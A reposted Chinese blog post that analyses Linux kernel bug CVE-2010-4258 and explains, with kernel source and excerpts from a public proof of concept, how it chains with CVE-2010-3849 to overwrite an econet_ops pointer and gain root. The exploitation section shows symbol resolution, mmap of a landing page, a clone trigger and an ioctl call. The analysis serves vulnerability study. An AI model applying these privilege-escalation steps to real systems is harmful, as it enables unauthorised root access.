# 【转】CVE-2010-4258 漏洞分析 - cgj - 博客园

> 原文：[`www.cnblogs.com/jiayy/p/4445086.html`](https://www.cnblogs.com/jiayy/p/4445086.html)

**一. 漏洞简介**

CVE-2010-4258 这个漏洞很有意思，主要思路是如果通过 clone 函数去创建进程，并且带有 CLONE_CHILD_CLEARTID 标志，那么进程在退出的时候，可以造成内核任意地址写 0 的 bug。PoC 代码利用了多个漏洞来达到权限提升的目的。

**二. 前置知识 (进程创建、退出)**

1.当 fork 或者 clone 一个进程在的时候， copy_process 执行如下操作：

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  static struct task_struct *copy_process(unsigned long clone_flags,  
2.  unsigned long stack_start,  
3.  struct pt_regs *regs,  
4.  unsigned long stack_size,  
5.  int __user *child_tidptr,  
6.  struct pid *pid,  
7.  int trace)  
8.  {  
9.  p->set_child_tid = (clone_flags & CLONE_CHILD_SETTID) ? child_tidptr : NULL;  
10.  /* 
11.  * Clear TID on mm_release() 
12.  */  
13.  p->clear_child_tid = (clone_flags & CLONE_CHILD_CLEARTID) ? child_tidptr: NULL;  
14.  }  

如果 clone 的 flag 带有 CLONE_CHILD_CLEARTID 标志，那么 clear_child_tid 指针中就会保存应用层传递进来的 child_tidptr 的地址。

2.应用层调用 clone 函数，并传递 CLONE_CHILD_CLEARTID 标志，则 child_tidptr 指针就会被赋值给子进程的 clear_child_tid

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  clone((int (*)(void *))trigger,  
2.  (void *)((unsigned long)newstack + 65536),  
3.  CLONE_VM | CLONE_CHILD_CLEARTID | SIGCHLD,  
4.  &fildes, NULL, NULL, child_tidptr);  

3.进程在退出的时候调用 do_exit 清理资源，调用路径如下：do_exit->exit_mm->mm_release

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  /* 
2.  * If we're exiting normally, clear a user-space tid field if 
3.  * requested.  We leave this alone when dying by signal, to leave 
4.  * the value intact in a core dump, and to save the unnecessary 
5.  * trouble, say, a killed vfork parent shouldn't touch this mm. 
6.  * Userland only wants this done for a sys_exit. 
7.  */  
8.  if (tsk->clear_child_tid) {  
9.  if (!(tsk->flags & PF_SIGNALED) &&  
10.  atomic_read(&mm->mm_users) > 1) {  
11.  /* 
12.  * We don't check the error code - if userspace has 
13.  * not set up a proper pointer then tough luck. 
14.  */  
15.  put_user(0, tsk->clear_child_tid);  
16.  sys_futex(tsk->clear_child_tid, FUTEX_WAKE,  
17.  1, NULL, NULL, 0);  
18.  }  
19.  tsk->clear_child_tid = NULL;  
20.  }  

上述代码中，如果 tsk->clear_child_tid 不为空，那么其会调用 put_user(0, tsk->clear_child_tid);

4.put_user 其实是一个宏，具体是 __put_user_check 函数，它会将 tsk->clear_child_tid 的值置为 0

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  #define __put_user_check(x,ptr,size)                \  
2.  ({                              \  
3.  long __pu_err = -EFAULT;                \  
4.  __typeof__(*(ptr)) __user *__pu_addr = (ptr);       \  
5.  __typeof__(*(ptr)) __pu_val = x;            \  
6.  if (likely(access_ok(VERIFY_WRITE, __pu_addr, size)))   \  
7.  __put_user_size(__pu_val, __pu_addr, (size),    \  
8.  __pu_err);          \  
9.  __pu_err;                       \  
10.  })  

__put_user_check 函数会调用 access_ok 去检查传进来的参数是否合法

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  #define access_ok(type,addr,size)   _access_ok((unsigned long)(addr),(size))  

3.  int _access_ok(unsigned long addr, unsigned long size)  
4.  {  
5.  if (!size)  
6.  return 1;  

8.  if (!addr || addr > (0xffffffffUL - (size - 1)))  
9.  goto _bad_access;  

11.  if (segment_eq(get_fs(), KERNEL_DS))  
12.  return 1;  

14.  if (memory_start <= addr && (addr + size - 1) < memory_end)  
15.  return 1;  

17.  _bad_access:  
18.  pr_debug("Bad access attempt: pid[%d] addr[%08lx] size[0x%lx]\n",  
19.  current->pid, addr, size);  
20.  return 0;  
21.  }  

access_ok 也是一个宏，具体函数为 _access_ok，其主要对外部传进来的 addr 和 size 参数做合法性检查，其中关键调用语句如下

if (segment_eq(get_fs(), KERNEL_DS))
return 1;

# define get_fs() (current_thread_info()->addr_limit)

如果 get_fs() = KERNEL_DS，那么 _access_ok 检查始终返回 1.

**三. 前置知识（无效地址访问异常）**

每当我们访问一个无效地址的时候，系统便会执行 do_page_fault 去生成异常日志，结束异常进程等。

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  int do_page_fault(struct pt_regs *regs, unsigned long address,  
2.  unsigned int write_access, unsigned int trapno)  
3.  {  
4.  // ......  
5.  die("Oops", regs, (write_access << 15) | trapno, address);  
6.  do_exit(SIGKILL);  
7.  }  

**而往往一些内核 bug 产生的时候就满足 get_fs() = KERNEL_DS 这个条件，这个很关键。**

接下来看看 CVE-2010-3849 这个漏洞，它主要是一个 0 地址访问异常漏洞，msg->msg_name 可以由用户空间控制，因此可以是个 NULL 值。接下来的 saddr->cookie;这句调用就会造成 0 地址访问异常。

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  static int econet_sendmsg(struct kiocb *iocb, struct socket *sock,  
2.  struct msghdr *msg, size_t len)  
3.  {         
4.  struct sock *sk = sock->sk;  
5.  struct sockaddr_ec *saddr=(struct sockaddr_ec *)msg->msg_name;  

7.  eb->cookie = saddr->cookie;  
8.  }  

**四. 漏洞利用**

1.获取需要用到的函数地址

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  /* Resolve addresses of relevant symbols */  
2.  printf("[*] Resolving kernel addresses...\n");  
3.  econet_ioctl = get_kernel_sym("econet_ioctl");  
4.  econet_ops = get_kernel_sym("econet_ops");  
5.  commit_creds = (_commit_creds) get_kernel_sym("commit_creds");  
6.  prepare_kernel_cred = (_prepare_kernel_cred) get_kernel_sym("prepare_kernel_cred");  

2.申请一块新进程的栈空间

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  if(!(newstack = malloc(65536))) {  
2.  printf("[*] Failed to allocate memory.\n");  
3.  return -1;  
4.  }  

3.处理好需要映射的地址，比较关键

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  // econet_ops 中保存了各个 econet 函数的地址指针，  
2.  // 10 * sizeof(void *)到达 econet_ioctl 的下一个函数地址  
3.  // 再-1，那么清零的时候是清掉了 econet_ioctl 下个函数地址的高 24 字节和 econet_ioctl 函数的高 8 字节  
4.  target = econet_ops + 10 * sizeof(void *) - OFFSET;  

6.  // 清掉 econet_ioctl 函数的高 8 字节  
7.  landing = econet_ioctl << SHIFT >> SHIFT;  

9.  // landing 按页对齐，map 了 2 个页的内存  
10.  payload = mmap((void *)(landing & ~0xfff), 2 * 4096,  
11.  PROT_READ | PROT_WRITE | PROT_EXEC,  
12.  MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, 0, 0);  

14.  if ((long)payload == -1) {  
15.  rintf("[*] Failed to mmap() at target address.\n");  
16.  return -1;  
17.  }  

19.  // 将提权代码拷贝到 landing  
20.  memcpy((void *)landing, &trampoline, 1024);  

**ps.这里要说明一下，这里为什么要把地址映射到（econet_ioctl&0x00FFFFFF）地址范围内，而不是直接将 econet_ops 指针数组中的 econet_ioctl 函数地址清零呢。那是因为新版本的 linux 不允许用户直接调用 mmap 函数映射 0 地址了，所以采用了一个很巧妙的小技巧。**

可以调用查看下系统最低映射的地址，我这里是 65536

![](img/7cc4552454fbb10631be7bfd07fd62d5.png)

4.clone 进程

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  // trigger 用来触发 CVE-2010-3849 漏洞，是一个 0 地址访问异常  
2.  int trigger(int * fildes)  
3.  {  
4.  int ret;  
5.  struct ifreq ifr;  

7.  memset(&ifr, 0, sizeof(ifr));  
8.  strncpy(ifr.ifr_name, "eth0", IFNAMSIZ);  

10.  ret = ioctl(fildes[2], SIOCSIFADDR, &ifr);  

12.  if(ret < 0) {  
13.  printf("[*] Failed to set Econet address.\n");  
14.  return -1;  
15.  }  

17.  splice(fildes[3], NULL, fildes[1], NULL, 128, 0);  
18.  splice(fildes[0], NULL, fildes[2], NULL, 128, 0);  

20.  /* Shouldn't get here... */  
21.  exit(0);  
22.  }  

24.  // clone 进程，子进程调用 trigger 触发 0 地址访问的漏洞，进而将 target 指向的地址清 0  
25.  // 即清掉了 econet_ioctl 函数地址的高 8 字节  
26.  clone((int (*)(void *))trigger,  
27.  (void *)((unsigned long)newstack + 65536),  
28.  CLONE_VM | CLONE_CHILD_CLEARTID | SIGCHLD,  
29.  &fildes, NULL, NULL, target);  

5.最后 ioctl 函数触发底层的 econet_ioctl 函数执行，而 econet_ioctl 函数的高 8 字节已经被我们清零了，所以会调用到我们的 map 地址中，进而触发提权代码获得 root 权限

**[cpp]** [view plain](http://blog.csdn.net/hu3167343/article/details/36892563 "view plain")[copy](http://blog.csdn.net/hu3167343/article/details/36892563 "copy")![在 CODE 上查看代码片](https://code.csdn.net/snippets/417014 "在 CODE 上查看代码片")![派生到我的代码片](https://code.csdn.net/snippets/417014/fork "派生到我的代码片")

1.  sleep(1);  
2.  printf("[*] Triggering payload...\n");  
3.  ioctl(fildes[2], 0, NULL);  

参考文章：

[`web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-4258`](http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-4258)

[`www.exploit-db.com/exploits/15704/`](http://www.exploit-db.com/exploits/15704/)

[`hi.baidu.com/wzt85/item/2467d70f893700133a53eed9`](http://hi.baidu.com/wzt85/item/2467d70f893700133a53eed9)